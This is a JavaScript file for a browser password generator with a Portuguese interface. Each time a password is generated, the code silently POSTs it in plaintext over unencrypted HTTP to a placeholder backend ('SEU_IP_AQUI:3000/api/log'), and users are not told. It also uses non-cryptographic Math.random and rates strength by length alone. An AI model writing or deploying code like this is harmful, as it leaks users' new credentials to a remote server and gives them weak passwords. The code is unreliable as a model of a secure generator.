const API_URL = "http://SEU_IP_AQUI:3000";

function generatePassword() {
  const length = document.getElementById("length").value;
  const lower = document.getElementById("lower").checked;
  const upper = document.getElementById("upper").checked;
  const numbers = document.getElementById("numbers").checked;
  const symbols = document.getElementById("symbols").checked;

  let chars = "";
  if (lower) chars += "abcdefghijklmnopqrstuvwxyz";
  if (upper) chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  if (numbers) chars += "0123456789";
  if (symbols) chars += "!@#$%^&*()_+";

  if (!chars) {
    alert("Selecione ao menos uma opção.");
    return;
  }

  let password = "";
  for (let i = 0; i < length; i++) {
    password += chars[Math.floor(Math.random() * chars.length)];
  }

  document.getElementById("result").value = password;
  checkStrength(password);

  // 🔥 Envia para o backend
  fetch(`${API_URL}/api/log`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ password })
  })
  .then(res => res.json())
  .then(data => console.log("Salvo:", data))
  .catch(err => console.error("Erro:", err));
}

function copyPassword() {
  const input = document.getElementById("result");
  input.select();
  document.execCommand("copy");
  alert("Senha copiada!");
}

function checkStrength(password) {
  let strength = "Fraca";
  if (password.length >= 12) strength = "Média";
  if (password.length >= 16) strength = "Forte";
  document.getElementById("strength").innerText =
    "Força da senha: " + strength;
}
